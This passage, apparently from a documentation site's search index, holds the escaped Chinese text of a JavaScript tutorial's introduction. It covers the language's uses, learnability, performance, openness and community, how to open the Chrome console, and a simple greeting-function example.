\u53ef\u4ee5\u5b8c\u6210\u8bb8\u591a\u4ee5\u524d\u65e0\u6cd5\u60f3\u8c61\u7684\u4e8b\u60c5\u3002 \uff082\uff09Node Node \u9879\u76ee\u4f7f\u5f97 JavaScript \u53ef\u4ee5\u7528\u4e8e\u5f00\u53d1\u670d\u52a1\u5668\u7aef\u7684\u5927\u578b\u9879\u76ee\uff0c\u7f51\u7ad9\u7684\u524d\u540e\u7aef\u90fd\u7528 JavaScript \u5f00\u53d1\u5df2\u7ecf\u6210\u4e3a\u4e86\u73b0\u5b9e\u3002\u6709\u4e9b\u5d4c\u5165\u5f0f\u5e73\u53f0\uff08Raspberry Pi\uff09\u80fd\u591f\u5b89\u88c5 Node\uff0c\u4e8e\u662f JavaScript \u5c31\u80fd\u4e3a\u8fd9\u4e9b\u5e73\u53f0\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u3002 \uff083\uff09\u6570\u636e\u5e93\u64cd\u4f5c JavaScript \u751a\u81f3\u4e5f\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c\u6570\u636e\u5e93\u3002NoSQL \u6570\u636e\u5e93\u8fd9\u4e2a\u6982\u5ff5\uff0c\u672c\u8eab\u5c31\u662f\u5728 JSON\uff08JavaScript Object Notation\uff09\u683c\u5f0f\u7684\u57fa\u7840\u4e0a\u8bde\u751f\u7684\uff0c\u5927\u90e8\u5206 NoSQL \u6570\u636e\u5e93\u5141\u8bb8 JavaScript \u76f4\u63a5\u64cd\u4f5c\u3002\u57fa\u4e8e SQL \u8bed\u8a00\u7684\u5f00\u6e90\u6570\u636e\u5e93 PostgreSQL \u652f\u6301 JavaScript \u4f5c\u4e3a\u64cd\u4f5c\u8bed\u8a00\uff0c\u53ef\u4ee5\u90e8\u5206\u53d6\u4ee3 SQL \u67e5\u8be2\u8bed\u8a00\u3002 \uff084\uff09\u79fb\u52a8\u5e73\u53f0\u5f00\u53d1 JavaScript \u4e5f\u6b63\u5728\u6210\u4e3a\u624b\u673a\u5e94\u7528\u7684\u5f00\u53d1\u8bed\u8a00\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5b89\u5353\u5e73\u53f0\u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0ciOS \u5e73\u53f0\u4f7f\u7528 Objective-C \u6216 Swift \u8bed\u8a00\u5f00\u53d1\u3002\u8bb8\u591a\u4eba\u6b63\u5728\u52aa\u529b\uff0c\u8ba9 JavaScript \u6210\u4e3a\u5404\u4e2a\u5e73\u53f0\u7684\u901a\u7528\u5f00\u53d1\u8bed\u8a00\u3002 PhoneGap \u9879\u76ee\u5c31\u662f\u5c06 JavaScript \u548c HTML5 \u6253\u5305\u5728\u4e00\u4e2a\u5bb9\u5668\u4e4b\u4e2d\uff0c\u4f7f\u5f97\u5b83\u80fd\u540c\u65f6\u5728 iOS \u548c\u5b89\u5353\u4e0a\u8fd0\u884c\u3002Facebook \u516c\u53f8\u7684 React Native \u9879\u76ee\u5219\u662f\u5c06 JavaScript \u5199\u7684\u7ec4\u4ef6\uff0c\u7f16\u8bd1\u6210\u539f\u751f\u7ec4\u4ef6\uff0c\u4ece\u800c\u4f7f\u5b83\u4eec\u5177\u5907\u4f18\u79c0\u7684\u6027\u80fd\u3002 Mozilla \u57fa\u91d1\u4f1a\u7684\u624b\u673a\u64cd\u4f5c\u7cfb\u7edf Firefox OS\uff0c\u66f4\u662f\u76f4\u63a5\u5c06 JavaScript \u4f5c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u5e73\u53f0\u8bed\u8a00\uff0c\u4f46\u662f\u5f88\u53ef\u60dc\u8fd9\u4e2a\u9879\u76ee\u6ca1\u6709\u6210\u529f\u3002 \uff085\uff09\u5185\u5d4c\u811a\u672c\u8bed\u8a00 \u8d8a\u6765\u8d8a\u591a\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5c06 JavaScript \u4f5c\u4e3a\u5185\u5d4c\u7684\u811a\u672c\u8bed\u8a00\uff0c\u6bd4\u5982 Adobe \u516c\u53f8\u7684\u8457\u540d PDF \u9605\u8bfb\u5668 Acrobat\u3001Linux \u684c\u9762\u73af\u5883 GNOME 3\u3002 \uff086\uff09\u8de8\u5e73\u53f0\u7684\u684c\u9762\u5e94\u7528\u7a0b\u5e8f Chromium OS\u3001Windows 8 \u7b49\u64cd\u4f5c\u7cfb\u7edf\u76f4\u63a5\u652f\u6301 JavaScript \u7f16\u5199\u5e94\u7528\u7a0b\u5e8f\u3002Mozilla \u7684 Open Web Apps \u9879\u76ee\u3001Google \u7684 Chrome App \u9879\u76ee \u3001GitHub \u7684 Electron \u9879\u76ee \u3001\u4ee5\u53ca TideSDK \u9879\u76ee \uff0c\u90fd\u53ef\u4ee5\u7528\u6765\u7f16\u5199\u8fd0\u884c\u4e8e Windows\u3001Mac OS \u548c Android \u7b49\u591a\u4e2a\u684c\u9762\u5e73\u53f0\u7684\u7a0b\u5e8f\uff0c\u4e0d\u4f9d\u8d56\u6d4f\u89c8\u5668\u3002 \uff087\uff09\u5c0f\u7ed3 \u53ef\u4ee5\u9884\u671f\uff0cJavaScript \u6700\u7ec8\u5c06\u80fd\u8ba9\u4f60\u53ea\u7528\u4e00\u79cd\u8bed\u8a00\uff0c\u5c31\u5f00\u53d1\u51fa\u9002\u5e94\u4e0d\u540c\u5e73\u53f0\uff08\u5305\u62ec\u684c\u9762\u7aef\u3001\u670d\u52a1\u5668\u7aef\u3001\u624b\u673a\u7aef\uff09\u7684\u7a0b\u5e8f\u3002\u65e9\u57282013\u5e749\u6708\u7684 \u7edf\u8ba1 \u4e4b\u4e2d\uff0cJavaScript \u5c31\u662f\u5f53\u5e74 GitHub \u4e0a\u4f7f\u7528\u91cf\u6392\u540d\u7b2c\u4e00\u7684\u8bed\u8a00\u3002 \u8457\u540d\u7a0b\u5e8f\u5458 Jeff Atwood \u751a\u81f3\u63d0\u51fa\u4e86\u4e00\u6761 \u201cAtwood \u5b9a\u5f8b\u201d \uff1a \u201c\u6240\u6709\u53ef\u4ee5\u7528 JavaScript \u7f16\u5199\u7684\u7a0b\u5e8f\uff0c\u6700\u7ec8\u90fd\u4f1a\u51fa\u73b0 JavaScript \u7684\u7248\u672c\u3002\u201d(Any application that can be written in JavaScript will eventually be written in JavaScript.) \u6613\u5b66\u6027 \u00b6 \u76f8\u6bd4\u5b66\u4e60\u5176\u4ed6\u8bed\u8a00\uff0c\u5b66\u4e60 JavaScript \u6709\u4e00\u4e9b\u6709\u5229\u6761\u4ef6\u3002 \uff081\uff09\u5b66\u4e60\u73af\u5883\u65e0\u5904\u4e0d\u5728 \u53ea\u8981\u6709\u6d4f\u89c8\u5668\uff0c\u5c31\u80fd\u8fd0\u884c JavaScript \u7a0b\u5e8f\uff1b\u53ea\u8981\u6709\u6587\u672c\u7f16\u8f91\u5668\uff0c\u5c31\u80fd\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u8fd9\u610f\u5473\u7740\uff0c\u51e0\u4e4e\u6240\u6709\u7535\u8111\u90fd\u539f\u751f\u63d0\u4f9b JavaScript \u5b66\u4e60\u73af\u5883\uff0c\u4e0d\u7528\u53e6\u884c\u5b89\u88c5\u590d\u6742\u7684 IDE\uff08\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff09\u548c\u7f16\u8bd1\u5668\u3002 \uff082\uff09\u7b80\u5355\u6027 \u76f8\u6bd4\u5176\u4ed6\u811a\u672c\u8bed\u8a00\uff08\u6bd4\u5982 Python \u6216 Ruby\uff09\uff0cJavaScript \u7684\u8bed\u6cd5\u76f8\u5bf9\u7b80\u5355\u4e00\u4e9b\uff0c\u672c\u8eab\u7684\u8bed\u6cd5\u7279\u6027\u5e76\u4e0d\u662f\u7279\u522b\u591a\u3002\u800c\u4e14\uff0c\u90a3\u4e9b\u8bed\u6cd5\u4e2d\u7684\u590d\u6742\u90e8\u5206\uff0c\u4e5f\u4e0d\u662f\u5fc5\u9700\u8981\u5b66\u4f1a\u3002\u4f60\u5b8c\u5168\u53ef\u4ee5\u53ea\u7528\u7b80\u5355\u547d\u4ee4\uff0c\u5b8c\u6210\u5927\u90e8\u5206\u7684\u64cd\u4f5c\u3002 \uff083\uff09\u4e0e\u4e3b\u6d41\u8bed\u8a00\u7684\u76f8\u4f3c\u6027 JavaScript \u7684\u8bed\u6cd5\u5f88\u7c7b\u4f3c C/C++ \u548c Java\uff0c\u5982\u679c\u5b66\u8fc7\u8fd9\u4e9b\u8bed\u8a00\uff08\u4e8b\u5b9e\u4e0a\u5927\u591a\u6570\u5b66\u6821\u90fd\u6559\uff09\uff0cJavaScript \u7684\u5165\u95e8\u4f1a\u975e\u5e38\u5bb9\u6613\u3002 \u5fc5\u987b\u8bf4\u660e\u7684\u662f\uff0c\u867d\u7136\u6838\u5fc3\u8bed\u6cd5\u4e0d\u96be\uff0c\u4f46\u662f JavaScript \u7684\u590d\u6742\u6027\u4f53\u73b0\u5728\u53e6\u5916\u4e24\u4e2a\u65b9\u9762\u3002 \u9996\u5148\uff0c\u5b83\u6d89\u53ca\u5927\u91cf\u7684\u5916\u90e8 API\u3002JavaScript \u8981\u53d1\u6325\u4f5c\u7528\uff0c\u5fc5\u987b\u4e0e\u5176\u4ed6\u7ec4\u4ef6\u914d\u5408\uff0c\u8fd9\u4e9b\u5916\u90e8\u7ec4\u4ef6\u4e94\u82b1\u516b\u95e8\uff0c\u6570\u91cf\u6781\u5176\u5e9e\u5927\uff0c\u51e0\u4e4e\u6d89\u53ca\u7f51\u7edc\u5e94\u7528\u7684\u5404\u4e2a\u65b9\u9762\uff0c\u638c\u63e1\u5b83\u4eec\u7edd\u975e\u6613\u4e8b\u3002 \u5176\u6b21\uff0cJavaScript \u8bed\u8a00\u6709\u4e00\u4e9b\u8bbe\u8ba1\u7f3a\u9677\u3002\u67d0\u4e9b\u5730\u65b9\u76f8\u5f53\u4e0d\u5408\u7406\uff0c\u53e6\u4e00\u4e9b\u5730\u65b9\u5219\u4f1a\u51fa\u73b0\u602a\u5f02\u7684\u8fd0\u884c\u7ed3\u679c\u3002\u5b66\u4e60 JavaScript\uff0c\u5f88\u5927\u4e00\u90e8\u5206\u65f6\u95f4\u662f\u7528\u6765\u641e\u6e05\u695a\u54ea\u4e9b\u5730\u65b9\u6709\u9677\u9631\u3002Douglas Crockford \u5199\u8fc7\u4e00\u672c\u6709\u540d\u7684\u4e66\uff0c\u540d\u5b57\u5c31\u53eb \u300aJavaScript: The Good Parts\u300b \uff0c\u8a00\u4e0b\u4e4b\u610f\u5c31\u662f\u8fd9\u95e8\u8bed\u8a00\u4e0d\u597d\u7684\u5730\u65b9\u5f88\u591a\uff0c\u5fc5\u987b\u5199\u4e00\u672c\u4e66\u624d\u80fd\u8bb2\u6e05\u695a\u3002\u53e6\u5916\u4e00\u4e9b\u7a0b\u5e8f\u5458\u5219\u611f\u5230\uff0c\u4e3a\u4e86\u66f4\u5408\u7406\u5730\u7f16\u5199 JavaScript \u7a0b\u5e8f\uff0c\u5c31\u4e0d\u80fd\u7528 JavaScript \u6765\u5199\uff0c\u800c\u5fc5\u987b\u53d1\u660e\u65b0\u7684\u8bed\u8a00\uff0c\u6bd4\u5982 CoffeeScript\u3001TypeScript\u3001Dart \u8fd9\u4e9b\u65b0\u8bed\u8a00\u7684\u53d1\u660e\u76ee\u7684\uff0c\u591a\u591a\u5c11\u5c11\u90fd\u6709\u8fd9\u4e2a\u56e0\u7d20\u3002 \u5c3d\u7ba1\u5982\u6b64\uff0c\u76ee\u524d\u770b\u6765\uff0cJavaScript \u7684\u5730\u4f4d\u8fd8\u662f\u65e0\u6cd5\u52a8\u6447\u3002\u52a0\u4e4b\uff0c\u8bed\u8a00\u6807\u51c6\u7684\u5feb\u901f\u8fdb\u5316\uff0c\u4f7f\u5f97 JavaScript \u529f\u80fd\u65e5\u76ca\u589e\u5f3a\uff0c\u800c\u8bed\u6cd5\u7f3a\u9677\u548c\u602a\u5f02\u4e4b\u5904\u5f97\u5230\u4e86\u5f25\u8865\u3002\u6240\u4ee5\uff0cJavaScript \u8fd8\u662f\u503c\u5f97\u5b66\u4e60\uff0c\u51b5\u4e14\u5b83\u7684\u5165\u95e8\u771f\u7684\u4e0d\u96be\u3002 \u5f3a\u5927\u7684\u6027\u80fd \u00b6 JavaScript \u7684\u6027\u80fd\u4f18\u52bf\u4f53\u73b0\u5728\u4ee5\u4e0b\u65b9\u9762\u3002 \uff081\uff09\u7075\u6d3b\u7684\u8bed\u6cd5\uff0c\u8868\u8fbe\u529b\u5f3a\u3002 JavaScript \u65e2\u652f\u6301\u7c7b\u4f3c C \u8bed\u8a00\u6e05\u6670\u7684\u8fc7\u7a0b\u5f0f\u7f16\u7a0b\uff0c\u4e5f\u652f\u6301\u7075\u6d3b\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\uff0c\u53ef\u4ee5\u7528\u6765\u5199\u5e76\u53d1\u5904\u7406\uff08concurrent\uff09\u3002\u8fd9\u4e9b\u8bed\u6cd5\u7279\u6027\u5df2\u7ecf\u88ab\u8bc1\u660e\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u7528\u4e8e\u8bb8\u591a\u573a\u5408\uff0c\u5c24\u5176\u9002\u7528\u5f02\u6b65\u7f16\u7a0b\u3002 JavaScript \u7684\u6240\u6709\u503c\u90fd\u662f\u5bf9\u8c61\uff0c\u8fd9\u4e3a\u7a0b\u5e8f\u5458\u63d0\u4f9b\u4e86\u7075\u6d3b\u6027\u548c\u4fbf\u5229\u6027\u3002\u56e0\u4e3a\u4f60\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u3001\u6309\u7167\u9700\u8981\u968f\u65f6\u521b\u9020\u6570\u636e\u7ed3\u6784\uff0c\u4e0d\u7528\u8fdb\u884c\u9ebb\u70e6\u7684\u9884\u5b9a\u4e49\u3002 JavaScript \u7684\u6807\u51c6\u8fd8\u5728\u5feb\u901f\u8fdb\u5316\u4e2d\uff0c\u5e76\u4e0d\u65ad\u5408\u7406\u5316\uff0c\u6dfb\u52a0\u66f4\u9002\u7528\u7684\u8bed\u6cd5\u7279\u6027\u3002 \uff082\uff09\u652f\u6301\u7f16\u8bd1\u8fd0\u884c\u3002 JavaScript \u8bed\u8a00\u672c\u8eab\uff0c\u867d\u7136\u662f\u4e00\u79cd\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u4f46\u662f\u5728\u73b0\u4ee3\u6d4f\u89c8\u5668\u4e2d\uff0cJavaScript \u90fd\u662f\u7f16\u8bd1\u540e\u8fd0\u884c\u3002\u7a0b\u5e8f\u4f1a\u88ab\u9ad8\u5ea6\u4f18\u5316\uff0c\u8fd0\u884c\u6548\u7387\u63a5\u8fd1\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u3002\u800c\u4e14\uff0cJavaScript \u5f15\u64ce\u6b63\u5728\u5feb\u901f\u53d1\u5c55\uff0c\u6027\u80fd\u5c06\u8d8a\u6765\u8d8a\u597d\u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u79cd WebAssembly \u683c\u5f0f\uff0c\u5b83\u662f JavaScript \u5f15\u64ce\u7684\u4e2d\u95f4\u7801\u683c\u5f0f\uff0c\u5168\u90e8\u90fd\u662f\u4e8c\u8fdb\u5236\u4ee3\u7801\u3002\u7531\u4e8e\u8df3\u8fc7\u4e86\u7f16\u8bd1\u6b65\u9aa4\uff0c\u53ef\u4ee5\u8fbe\u5230\u63a5\u8fd1\u539f\u751f\u4e8c\u8fdb\u5236\u4ee3\u7801\u7684\u8fd0\u884c\u901f\u5ea6\u3002\u5404\u79cd\u8bed\u8a00\uff08\u4e3b\u8981\u662f C \u548c C++\uff09\u901a\u8fc7\u7f16\u8bd1\u6210 WebAssembly\uff0c\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u8fd0\u884c\u3002 \uff083\uff09\u4e8b\u4ef6\u9a71\u52a8\u548c\u975e\u963b\u585e\u5f0f\u8bbe\u8ba1\u3002 JavaScript \u7a0b\u5e8f\u53ef\u4ee5\u91c7\u7528\u4e8b\u4ef6\u9a71\u52a8\uff08event-driven\uff09\u548c\u975e\u963b\u585e\u5f0f\uff08non-blocking\uff09\u8bbe\u8ba1\uff0c\u5728\u670d\u52a1\u5668\u7aef\u9002\u5408\u9ad8\u5e76\u53d1\u73af\u5883\uff0c\u666e\u901a\u7684\u786c\u4ef6\u5c31\u53ef\u4ee5\u627f\u53d7\u5f88\u5927\u7684\u8bbf\u95ee\u91cf\u3002 \u5f00\u653e\u6027 \u00b6 JavaScript \u662f\u4e00\u79cd\u5f00\u653e\u7684\u8bed\u8a00\u3002\u5b83\u7684\u6807\u51c6 ECMA-262 \u662f ISO \u56fd\u9645\u6807\u51c6\uff0c\u5199\u5f97\u975e\u5e38\u8be6\u5c3d\u660e\u786e\uff1b\u8be5\u6807\u51c6\u7684\u4e3b\u8981\u5b9e\u73b0\uff08\u6bd4\u5982 V8 \u548c SpiderMonkey \u5f15\u64ce\uff09\u90fd\u662f\u5f00\u653e\u7684\uff0c\u800c\u4e14\u8d28\u91cf\u5f88\u9ad8\u3002\u8fd9\u4fdd\u8bc1\u4e86\u8fd9\u95e8\u8bed\u8a00\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u516c\u53f8\u6216\u4e2a\u4eba\uff0c\u4e0d\u5b58\u5728\u7248\u6743\u548c\u4e13\u5229\u7684\u95ee\u9898\u3002 \u8bed\u8a00\u6807\u51c6\u7531 TC39 \u59d4\u5458\u4f1a\u8d1f\u8d23\u5236\u5b9a\uff0c\u8be5\u59d4\u5458\u4f1a\u7684\u8fd0\u4f5c\u662f\u900f\u660e\u7684\uff0c\u6240\u6709\u8ba8\u8bba\u90fd\u662f\u5f00\u653e\u7684\uff0c\u4f1a\u8bae\u8bb0\u5f55\u90fd\u4f1a\u5bf9\u5916\u516c\u5e03\u3002 \u4e0d\u540c\u516c\u53f8\u7684 JavaScript \u8fd0\u884c\u73af\u5883\uff0c\u517c\u5bb9\u6027\u5f88\u597d\uff0c\u7a0b\u5e8f\u4e0d\u505a\u8c03\u6574\u6216\u53ea\u505a\u5f88\u5c0f\u7684\u8c03\u6574\uff0c\u5c31\u80fd\u5728\u6240\u6709\u6d4f\u89c8\u5668\u4e0a\u8fd0\u884c\u3002 \u793e\u533a\u652f\u6301\u548c\u5c31\u4e1a\u673a\u4f1a \u00b6 \u5168\u4e16\u754c\u7a0b\u5e8f\u5458\u90fd\u5728\u4f7f\u7528 JavaScript\uff0c\u5b83\u6709\u7740\u6781\u5927\u7684\u793e\u533a\u3001\u5e7f\u6cdb\u7684\u6587\u732e\u548c\u56fe\u4e66\u3001\u4e30\u5bcc\u7684\u4ee3\u7801\u8d44\u6e90\u3002\u7edd\u5927\u90e8\u5206\u4f60\u9700\u8981\u7528\u5230\u7684\u529f\u80fd\uff0c\u90fd\u6709\u591a\u4e2a\u5f00\u6e90\u51fd\u6570\u5e93\u53ef\u4f9b\u9009\u7528\u3002 \u4f5c\u4e3a\u9879\u76ee\u8d1f\u8d23\u4eba\uff0c\u4f60\u4e0d\u96be\u62db\u8058\u5230\u6570\u91cf\u4f17\u591a\u7684 JavaScript \u7a0b\u5e8f\u5458\uff1b\u4f5c\u4e3a\u5f00\u53d1\u8005\uff0c\u4f60\u4e5f\u4e0d\u96be\u627e\u5230\u4e00\u4efd JavaScript \u7684\u5de5\u4f5c\u3002 \u5b9e\u9a8c\u73af\u5883 \u00b6 \u672c\u6559\u7a0b\u5305\u542b\u5927\u91cf\u7684\u793a\u4f8b\u4ee3\u7801\uff0c\u53ea\u8981\u7535\u8111\u5b89\u88c5\u4e86\u6d4f\u89c8\u5668\uff0c\u5c31\u53ef\u4ee5\u7528\u6765\u5b9e\u9a8c\u4e86\u3002\u8bfb\u8005\u53ef\u4ee5\u4e00\u8fb9\u8bfb\u4e00\u8fb9\u8fd0\u884c\u793a\u4f8b\uff0c\u52a0\u6df1\u7406\u89e3\u3002 \u63a8\u8350\u5b89\u88c5 Chrome \u6d4f\u89c8\u5668\uff0c\u5b83\u7684\u201c\u5f00\u53d1\u8005\u5de5\u5177\u201d\uff08Developer Tools\uff09\u91cc\u9762\u7684\u201c\u63a7\u5236\u53f0\u201d\uff08console\uff09\uff0c\u5c31\u662f\u8fd0\u884c JavaScript \u4ee3\u7801\u7684\u7406\u60f3\u73af\u5883\u3002 \u8fdb\u5165 Chrome \u6d4f\u89c8\u5668\u7684\u201c\u63a7\u5236\u53f0\u201d\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u3002 \u76f4\u63a5\u8fdb\u5165\uff1a\u6309\u4e0b Option + Command + J \uff08Mac\uff09\u6216\u8005 Ctrl + Shift + J \uff08Windows / Linux\uff09 \u5f00\u53d1\u8005\u5de5\u5177\u8fdb\u5165\uff1a\u5f00\u53d1\u8005\u5de5\u5177\u7684\u5feb\u6377\u952e\u662f F12\uff0c\u6216\u8005 Option + Command + I \uff08Mac\uff09\u4ee5\u53ca Ctrl + Shift + I \uff08Windows / Linux\uff09\uff0c\u7136\u540e\u9009\u62e9 Console \u9762\u677f \u8fdb\u5165\u63a7\u5236\u53f0\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u5728\u63d0\u793a\u7b26\u540e\u8f93\u5165\u4ee3\u7801\uff0c\u7136\u540e\u6309 Enter \u952e\uff0c\u4ee3\u7801\u5c31\u4f1a\u6267\u884c\u3002\u5982\u679c\u6309 Shift + Enter \u952e\uff0c\u5c31\u662f\u4ee3\u7801\u6362\u884c\uff0c\u4e0d\u4f1a\u89e6\u53d1\u6267\u884c\u3002\u5efa\u8bae\u9605\u8bfb\u672c\u6559\u7a0b\u65f6\uff0c\u5c06\u4ee3\u7801\u590d\u5236\u5230\u63a7\u5236\u53f0\u8fdb\u884c\u5b9e\u9a8c\u3002 \u4f5c\u4e3a\u5c1d\u8bd5\uff0c\u4f60\u53ef\u4ee5\u5c06\u4e0b\u9762\u7684\u7a0b\u5e8f\u590d\u5236\u5230\u201c\u63a7\u5236\u53f0\u201d\uff0c\u6309\u4e0b\u56de\u8f66\u540e\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u8fd0\u884c\u7ed3\u679c\u3002 1 2 3 4 5 6 function greetMe ( yourName ) { console . log ( 'Hello ' + yourName ); } greetMe ( 'World' ) // Hello World","title":"\u5bfc\u8bba"},{"location":"basic/introduction/#_1","text":"","title":"\u5bfc\u8bba"},{"location":"basic/introduction/#javascript","text":"JavaScript \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684\u811a\u672c\u8bed\u8a00\u3002\u6240\u8c13\u201c\u811a\u672c\u8bed\u8a00\u201d\uff08script language\uff09\uff0c\u6307\u7684\u662f\u5b83\u4e0d\u5177\u5907\u5f00\u53d1\u64cd\u4f5c\u7cfb\u7edf\u7684\u80fd\u529b\uff0c\u800c\u662f\u53ea\u7528\u6765\u7f16\u5199\u63a7\u5236\u5176\u4ed6\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6d4f\u89c8\u5668\uff09\u7684\u201c\u811a\u672c\u201d\u3002 JavaScript \u4e5f\u662f\u4e00\u79cd\u5d4c\u5165\u5f0f\uff08embedded\uff09\u8bed\u8a00\u3002\u5b83\u672c\u8eab\u63d0\u4f9b\u7684\u6838\u5fc3\u8bed\u6cd5\u4e0d\u7b97\u5f88\u591a\uff0c\u53ea\u80fd\u7528\u6765\u505a\u4e00\u4e9b\u6570\u5b66\u548c\u903b\u8f91\u8fd0\u7b97\u3002JavaScript \u672c\u8eab\u4e0d\u63d0\u4f9b\u4efb\u4f55\u4e0e I/O\uff08\u8f93\u5165/\u8f93\u51fa\uff09\u76f8\u5173\u7684 API\uff0c\u90fd\u8981\u9760\u5bbf\u4e3b\u73af\u5883\uff08host\uff09\u63d0\u4f9b\uff0c\u6240\u4ee5 JavaScript \u53ea\u5408\u9002\u5d4c\u5165\u66f4\u5927\u578b\u7684\u5e94\u7528\u7a0b\u5e8f\u73af\u5883\uff0c\u53bb\u8c03\u7528\u5bbf\u4e3b\u73af\u5883\u63d0\u4f9b\u7684\u5e95\u5c42 API\u3002 \u76ee\u524d\uff0c\u5df2\u7ecf\u5d4c\u5165 JavaScript \u7684\u5bbf\u4e3b\u73af\u5883\u6709\u591a\u79cd\uff0c\u6700\u5e38\u89c1\u7684\u73af\u5883\u5c31\u662f\u6d4f\u89c8\u5668\uff0c\u53e6\u5916\u8fd8\u6709\u670d\u52a1\u5668\u73af\u5883\uff0c\u4e5f\u5c31\u662f Node \u9879\u76ee\u3002 \u4ece\u8bed\u6cd5\u89d2\u5ea6\u770b\uff0cJavaScript \u8bed\u8a00\u662f\u4e00\u79cd\u201c\u5bf9\u8c61\u6a21\u578b\u201d\u8bed\u8a00\u3002\u5404\u79cd\u5bbf\u4e3b\u73af\u5883\u901a\u8fc7\u8fd9\u4e2a\u6a21\u578b\uff0c\u63cf\u8ff0\u81ea\u5df1\u7684\u529f\u80fd\u548c\u64cd\u4f5c\u63a5\u53e3\uff0c\u4ece\u800c\u901a\u8fc7 JavaScript \u63a7\u5236\u8fd9\u4e9b\u529f\u80fd\u3002\u4f46\u662f\uff0cJavaScript \u5e76\u4e0d\u662f\u7eaf\u7cb9\u7684\u201c\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u201d\uff0c\u8fd8\u652f\u6301\u5176\u4ed6\u7f16\u7a0b\u8303\u5f0f\uff08\u6bd4\u5982\u51fd\u6570\u5f0f\u7f16\u7a0b\uff09\u3002\u8fd9\u5bfc\u81f4\u51e0\u4e4e\u4efb\u4f55\u4e00\u4e2a\u95ee\u9898\uff0cJavaScript \u90fd\u6709\u591a\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002\u9605\u8bfb\u672c\u4e66\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u4f1a\u8be7\u5f02\u4e8e JavaScript \u8bed\u6cd5\u7684\u7075\u6d3b\u6027\u3002 JavaScript \u7684\u6838\u5fc3\u8bed\u6cd5\u90e8\u5206\u76f8\u5f53\u7cbe\u7b80\uff0c\u53ea\u5305\u62ec\u4e24\u4e2a\u90e8\u5206\uff1a\u57fa\u672c\u7684\u8bed\u6cd5\u6784\u9020\uff08\u6bd4\u5982\u64cd\u4f5c\u7b26\u3001\u63a7\u5236\u7ed3\u6784\u3001\u8bed\u53e5\uff09\u548c\u6807\u51c6\u5e93\uff08\u5c31\u662f\u4e00\u7cfb\u5217\u5177\u6709\u5404\u79cd\u529f\u80fd\u7684\u5bf9\u8c61\u6bd4\u5982 Array \u3001 Date \u3001 Math \u7b49\uff09\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u79cd\u5bbf\u4e3b\u73af\u5883\u63d0\u4f9b\u989d\u5916\u7684 API\uff08\u5373\u53ea\u80fd\u5728\u8be5\u73af\u5883\u4f7f\u7528\u7684\u63a5\u53e3\uff09\uff0c\u4ee5\u4fbf JavaScript \u8c03\u7528\u3002\u4ee5\u6d4f\u89c8\u5668\u4e3a\u4f8b\uff0c\u5b83\u63d0\u4f9b\u7684\u989d\u5916 API \u53ef\u4ee5\u5206\u6210\u4e09\u5927\u7c7b\u3002 \u6d4f\u89c8\u5668\u63a7\u5236\u7c7b\uff1a\u64cd\u4f5c\u6d4f\u89c8\u5668 DOM \u7c7b\uff1a\u64cd\u4f5c\u7f51\u9875\u7684\u5404\u79cd\u5143\u7d20 Web \u7c7b\uff1a\u5b9e\u73b0\u4e92\u8054\u7f51\u7684\u5404\u79cd\u529f\u80fd \u5982\u679c\u5bbf\u4e3b\u73af\u5883\u662f\u670d\u52a1\u5668\uff0c\u5219\u4f1a\u63d0\u4f9b\u5404\u79cd\u64cd\u4f5c\u7cfb\u7edf\u7684 API\uff0c\u6bd4\u5982\u6587\u4ef6\u64cd\u4f5c API\u3001\u7f51\u7edc\u901a\u4fe1 API\u7b49\u7b49\u3002\u8fd9\u4e9b\u4f60\u90fd\u53ef\u4ee5\u5728 Node \u73af\u5883\u4e2d\u627e\u5230\u3002 \u672c\u4e66\u4e3b\u8981\u4ecb\u7ecd JavaScript \u6838\u5fc3\u8bed\u6cd5\u548c\u6d4f\u89c8\u5668\u7f51\u9875\u5f00\u53d1\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u4e0d\u6d89\u53ca Node\u3002\u5168\u4e66\u53ef\u4ee5\u5206\u6210\u4ee5\u4e0b\u56db\u5927\u90e8\u5206\u3002 \u57fa\u672c\u8bed\u6cd5 \u6807\u51c6\u5e93 \u6d4f\u89c8\u5668 API DOM JavaScript \u8bed\u8a00\u6709\u591a\u4e2a\u7248\u672c\u3002\u672c\u4e66\u7684\u5185\u5bb9\u4e3b\u8981\u57fa\u4e8e ECMAScript 5.1 \u7248\u672c\uff0c\u8fd9\u662f\u5b66\u4e60 JavaScript \u8bed\u6cd5\u7684\u57fa\u7840\u3002ES6 \u548c\u66f4\u65b0\u7684\u8bed\u6cd5\u8bf7\u53c2\u8003\u6211\u5199\u7684 \u300aECMAScript 6\u5165\u95e8\u300b \u3002","title":"\u4ec0\u4e48\u662f JavaScript \u8bed\u8a00\uff1f"},{"location":"basic/introduction/#javascript_1","text":"JavaScript 